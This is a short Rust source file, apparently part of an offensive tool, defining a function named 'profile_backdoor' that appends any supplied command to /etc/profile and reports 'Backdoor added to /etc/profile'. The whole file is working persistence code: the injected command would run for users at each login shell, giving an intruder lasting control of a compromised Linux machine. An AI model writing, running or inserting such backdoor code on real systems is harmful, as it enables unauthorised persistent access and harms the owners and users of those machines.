use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;
use crate::ui::{print_status, print_success};

pub fn profile_backdoor(command: String) {
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("/etc/profile")
        .expect("Failed to open /etc/profile");

    file.write_all(format!("\n{}", command).as_bytes()).expect("Failed to write to /etc/profile");
    print_status("Backdoor added to /etc/profile");
}